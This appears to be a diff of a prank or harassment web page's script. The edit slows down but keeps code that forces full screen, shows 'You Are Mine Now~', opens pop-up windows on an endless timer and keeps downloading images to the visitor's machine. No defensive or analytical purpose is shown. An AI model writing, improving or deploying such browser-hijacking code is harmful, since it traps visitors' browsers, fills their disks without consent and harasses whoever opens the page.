@@ -101,13 +101,13 @@
             goFullScreen(); // Forces full-screen
             document.body.innerHTML += "<h1>You Are Mine Now~ 💕</h1>";
 
-            // Change background every 1 second
+            // Change background every 3 seconds (slower)
             setInterval(() => {
                 let imgURL = getRandomImage();
                 document.body.style.backgroundImage = `url(${imgURL})`;
-            }, 1000);
+            }, 3000); // Changed to 3 seconds
 
-            // **Infinite Pop-ups** - No stopping ever
+            // **Infinite Pop-ups** - No stopping ever (slower)
             function openPopup() {
                 let imgURL = getRandomImage();
                 let left = Math.random() * screen.width;
@@ -119,13 +119,13 @@
                 }
             }
 
-            // Open new pop-ups continuously, no stopping
+            // Open new pop-ups continuously, slower
             setInterval(() => {
                 openPopup();
                 openPopup();  // More pop-ups spawn together
-            }, 200); // Every 0.2 seconds new pop-ups spawn
+            }, 2000); // Changed to 2 seconds
 
-            // Auto-download images every second
+            // Auto-download images every 3 seconds (slower)
             setInterval(() => {
                 let imgURL = getRandomImage();
                 let link = document.createElement('a');
@@ -134,7 +134,7 @@
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
-            }, 1000);
+            }, 3000); // Changed to 3 seconds
         }
     </script>
 </head>
